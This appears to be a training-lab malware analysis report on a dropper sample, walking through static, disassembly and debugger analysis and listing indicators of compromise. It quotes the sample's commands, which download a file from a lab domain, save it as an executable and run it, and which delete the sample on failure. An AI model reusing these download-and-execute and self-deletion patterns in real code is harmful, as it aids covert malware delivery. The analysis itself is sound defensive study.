# Dropper.DownloadFromURL.exe

## Identification:

**FileName:** Malware.Unknown.exe

**SHA256:** 92730427321A1C4CCFC0D0580834DAEF98121EFA9BB8963DA332BFD6CF1FDA8A

**FileSize:** 12288 (bytes)

<br>

## Analysis:

### Basic Static Analysis:

For the initial triage, the file was loaded in PEStudio as shown below. 

<image src="../Images/Dropper.DownloadFromURL.exe1.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

Followings were found:
- The entropy of this sample was low (5.719 out of 8) so the sample is not packed.
- The sample was written in C++
- The sampole is 32-bit and has CLI interface.
- The sample was compiled on Sat Sep 04 11:11:12 2021.

<br>

Then using capa tool, the sample was analyzed to check its behavior with the command:

`capa  Malware.Unknown.exe`

    +------------------------+------------------------------------------------------------------------------------+
    | ATT&CK Tactic          | ATT&CK Technique                                                                   |
    |------------------------+------------------------------------------------------------------------------------|
    | EXECUTION              | Shared Modules [T1129]                                                             |
    +------------------------+------------------------------------------------------------------------------------+
    
    +-----------------------------+-------------------------------------------------------------------------------+
    | MBC Objective               | MBC Behavior                                                                  |
    |-----------------------------+-------------------------------------------------------------------------------|
    | COMMAND AND CONTROL         | C2 Communication::Receive Data [B0030.002]                                    |
    | COMMUNICATION               | HTTP Communication::Create Request [C0002.012]                                |
    |                             | HTTP Communication::Download URL [C0002.006]                                  |
    |                             | HTTP Communication::Open URL [C0002.004]                                      |
    | PROCESS                     | Create Process [C0017]                                                        |
    |                             | Terminate Process [C0018]                                                     |
    +-----------------------------+-------------------------------------------------------------------------------+
    
    +------------------------------------------------------+------------------------------------------------------+
    | CAPABILITY                                           | NAMESPACE                                            |
    |------------------------------------------------------+------------------------------------------------------|
    | receive data                                         | communication                                        |
    | connect to URL                                       | communication/http/client                            |
    | contains PDB path                                    | executable/pe/pdb                                    |
    | contain a resource (.rsrc) section                   | executable/pe/section/rsrc                           |
    | create process (2 matches)                           | host-interaction/process/create                      |
    | terminate process                                    | host-interaction/process/terminate                   |
    | terminate process via fastfail (2 matches)           | host-interaction/process/terminate                   |
    | parse PE header (2 matches)                          | load-code/pe                                         |
    +------------------------------------------------------+------------------------------------------------------+

- The sample will reach to its C2 to request and download some file.
- The sample will create some process, most likely to execute the downloaded file.
- The sample will terminate process, most likely itself when it cannot reach the C2.

<br>

Then the strings were checked using the FLOSS tool with the command:

`floss.exe Malware.Unknown.ex`

The interesting strings found were:

    C:\Users\Matt\source\repos\HuskyHacks\PMAT-maldev\src\DownloadFromURL\Release\DownloadFromURL.pdb
    cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "%s"
    http://ssl-6582datamanager.helpdeskbros.local/favicon.ico
    C:\Users\Public\Documents\CR433101.dat.exe
    Mozilla/5.0
    http://huskyhacks.dev
    ping 1.1.1.1 -n 1 -w 3000 > Nul & C:\Users\Public\Documents\CR433101.dat.exe
    open

- Some interesting commands as well as URL were found in the strings.

<br>

### Basic Dynamic Analysis:

The sample was then executed for dynamic analysis. Before execution of samples, tools like Process Monitor, Process Explorer and Wireshark were also runned for behavior analysis. 

The sample was then executed for dynamic analysis. On execution, it try to reach ssl-6582datamanager[.]helpdeskbros[.]local as shown in the Wireshark capture below. Since the lab was isolated with no network simulation active, the resolution to that domain fail making the sample unable to reach it.

<image src="../Images/Dropper.DownloadFromURL.exe2.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

After the sample failed to reach ssl-6582datamanager[.]helpdeskbros[.]local, it deleted itself as shown in Process Monitor capture.

<image src="../Images/Dropper.DownloadFromURL.exe3.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

<br>

Now in Remnux machine, INetSim was runned for network simulation. 

<image src="../Images/putty.exe7.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

After that the sample was executed again. This time, the sample again try to reach ssl-6582datamanager[.]helpdeskbros[.]local and successfully resolute to IP of the Remnux machine and start connection over port 80. The sample then requested favicon.ico over HTTP. After that it tried to reach huskyhacks[.]dev. This all were discovered in the Wireshark capture as shown below.

<image src="../Images/Dropper.DownloadFromURL.exe4.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

<br>

In the Process Monitor capture, it was found that the requested file favicon.ico was first cached temporarily. Also the sample had saved CR433101.dat.exe under Public Documents which could actually be the requested favicon.ico. This can be further verified during advanced dynamic analysis by debugging.

<image src="../Images/Dropper.DownloadFromURL.exe5.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

The CR433101.dat.exe dropped under Public Document was also verified.

<image src="../Images/Dropper.DownloadFromURL.exe6.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

This sample capabilities will be unraveled in detail in the following advanced analysis sections.

<br>

### Advanced Static Analysis:

For the advanced static analysis of this sample, the sample was loaded in Cutter tool to disassemble it. After that it was jumped to the main function and interesting part was identified as shown in the image below.

<image src="../Images/Dropper.DownloadFromURL.exe7.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

Let's drill down this code. This will later help in debugging as well during advanced dynamic analysis.

- In this section of code, first call to InternetOpen can be seen which is using Mozilla user-agent to initiate network connection.
- Then call to URLDownloadToFile can be seen which is downloading its component resource from  hxxp[:]//ssl-6582datamanager[.]helpdeskbros[.]local/favicon[.]ico and saved it under C:\Users\Public\Documents\CR433101.dat.exe.
- Immediately after that, there is test eax, eax instruction (bitwise operation).
- After that there is JNZ instruction, which will jump if not zero, i.e., jumps if ZF is not set (ZF=0).
- So after call to URLDownloadToFile:
    - If fail to download, eax=1 so when test eax, eax (result is 1); ZF=0, jumps to [0x00401142].
    - If successfully download, eax=0 so when test eax, eax (result is 0); ZF=1, so does not jump and continue to [0x004010e3].
- If did not jump [0x004010e3]:
    - There is call to InternetOpenURL to open hxxp[:]//huskyhacks[.]dev.
    - After that, there is call to ShellExecute that checks the internet connectivity with ping and execute the dropped CR433101.dat.exe.
- If jumps [0x00401142]:
    - Checks internet connectivity with ping and then deletes iself.

<br>

### Advanced Dynamic Analysis:

For the dynamic analysis, the sample was loaded in x32dbg. Then breakpoints were added in the interesting APIs identified during advanced static analysis.

    bp InternetOpenW
    bp URLDownloadToFileW
    bp InternetOpenUrlW
    bp ShellExecuteW
    bp CreateProcess

In x32dbg, the sample was executed till it reach the breakpoint on InternetOpenW as shown below. 

<image src="../Images/Dropper.DownloadFromURL.exe8.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

    HINTERNET InternetOpenW(
	    [in] LPCWSTR lpszAgent,
	    [in] DWORD dwAccessType,
	    [in] LPCWSTR lpszProxy,
	    [in] LPCWSTR lpszProxyBypass,
	    [in] DWORD dwFlags
    );

On the right side, the parameters passed to InternetOpenW can be seen where the first parameter was "Mozilla/5.0" which is the User Agent used to initate network connection.

<br>

After this it was again executed till next breakpoint on URLDownloadToFileW as shown below. 

<image src="../Images/Dropper.DownloadFromURL.exe9.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

    HRESULT URLDownloadToFile(
    	LPUNKNOWN pCaller,
    	LPCTSTR szURL,
    	LPCTSTR szFileName,
    	_Reserved_ DWORD dwReserved,
    	LPBINDSTATUSCALLBACK lpfnCB
    );

Again on the right side, the parameters passed to DownloadFromURL can be seen. The second parameter is the URL which is "hxxp[:]//ssl-6582datamanager.helpdeskbros.local/favicon.ico" and the third parameter is the file name which is "C:\\Users\\Public\\Documents\\CR433101.dat.exe". So the sample will reach out to ssl-6582datamanager[.]helpdeskbros[.]local and download favicon.ico and save it as CR433101.dat.exe under C:\Users\Public\Documents. The hypothesis during basic dynamic analysis of CR433101.dat.exe being the favicon.ico was true.

<br>

In the Remnux machine, the INetSim machine was running to simulate the network so the sample should be able to download the remote resource. In the x32dbg, it was jumped to return value (eax) of this DownloadFromURL API, which was 0 . This mean the sample successfully downloaded the remote resource. If it had failed then the return value (eax) would be 1.

<image src="../Images/Dropper.DownloadFromURL.exe10.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

<br>

After this it was then jumped to user code which landed on test instruction.  

<image src="../Images/Dropper.DownloadFromURL.exe11.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

As mentioned before, the test instruction will perform AND operation. Also, the return value (eax) from DownloadFromURL was 0. The instruction test eax, eax will return 0 since 0 AND 0 is 0. So, the Zero Flag (ZF) will be 1 as shown in image below.

<image src="../Images/Dropper.DownloadFromURL.exe12.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

<br>

The next instruction jne will not take the jump since ZF=1 (which is zero/equal) and continue the execution of instruction after it. Then, the program was then run till it hit the next breakpoint on InternetOpenUrlW as shown below.

<image src="../Images/Dropper.DownloadFromURL.exe13.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

    HINTERNET InternetOpenUrlW(
      [in] HINTERNET hInternet,
      [in] LPCWSTR   lpszUrl,
      [in] LPCWSTR   lpszHeaders,
      [in] DWORD     dwHeadersLength,
      [in] DWORD     dwFlags,
      [in] DWORD_PTR dwContext
    );

Here, on the right side, the parameters passed to InternetOpenUrlW can be seen. The second parameter is the URL which is hxxp[:]//huskyhacks[.]dev. The sample will open this URL.

<br>

After this it was again executed till next breakpoint on ShellExecuteW as shown below. 

<image src="../Images/Dropper.DownloadFromURL.exe14.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

    HINSTANCE ShellExecuteA(
      [in, optional] HWND   hwnd,
      [in, optional] LPCSTR lpOperation,
      [in]           LPCSTR lpFile,
      [in, optional] LPCSTR lpParameters,
      [in, optional] LPCSTR lpDirectory,
      [in]           INT    nShowCmd
    );

Again on the right side, the parameters passed to ShellExecuteW can be seen. The second parameter passed "open" is the operation that will be performed by this API. The operation performed will be on third parameter which is "ping 1.1.1.1 -n 1 -w 3000 > Nul & C:\\Users\\Public\\Documents\\CR433101.dat.exe". So the sample will ping 1.1.1.1 one time to check connectivity and then execute the previously dropped file CR433101.dat.exe.

<br>

Lets also verify this sample capability when there is no internet connectivity. This time the sample was again loaded in x32dbg but the INetSim was not runned on Remnux machine. This time the return value (eax) from DownloadfromURL call was a non-zero value as shown below.

<image src="../Images/Dropper.DownloadFromURL.exe15.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

After this, the test instruction will perform AND operation.  Also, the return value (eax) from DownloadFromURL was a non zero. The instruction test eax, eax will return non-zero since non-zero AND non-zero is non-zero. So, the Zero Flag (ZF) will be 0 as shown in image below.

<image src="../Images/Dropper.DownloadFromURL.exe16.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

<br>

In this case, the next instruction jne will take the jump since ZF=0 (which is not zero/equal) and jumps to [0x00401142]. The sample was executed till it reach the next breakpoint on CreateProcessW as shown below.

<image src="../Images/Dropper.DownloadFromURL.exe17.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

    BOOL CreateProcessA(
      [in, optional]      LPCSTR                lpApplicationName,
      [in, out, optional] LPSTR                 lpCommandLine,
      [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
      [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
      [in]                BOOL                  bInheritHandles,
      [in]                DWORD                 dwCreationFlags,
      [in, optional]      LPVOID                lpEnvironment,
      [in, optional]      LPCSTR                lpCurrentDirectory,
      [in]                LPSTARTUPINFOA        lpStartupInfo,
      [out]               LPPROCESS_INFORMATION lpProcessInformation
    );

Here, on the right side, the parameters passed to CreateProcessW can be seen. The second parameter is the commandline which is "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"C:\\Users\\VENUS\\Desktop\\PMAT labs\\2-2.AdvancedDynamicAnalysis\\Dropper.DownloadFromURL.exe" which will ping 1.1.1.1 one time to check connectivity and delete itself.

<br>

## Indicator of Compromise 

### Network-based Indicators
- hxxp[:]//ssl-6582datamanager.helpdeskbros.local/favicon.ico
- hxxp[:]//huskyhacks[.]dev

### Host-based Indicators
- The CR433101.dat.exe dropped under Public document.
- In absence of network connectivity, the cmd.exe process spawned by sample that ping 1.1.1.1 one time and then deleted itself.
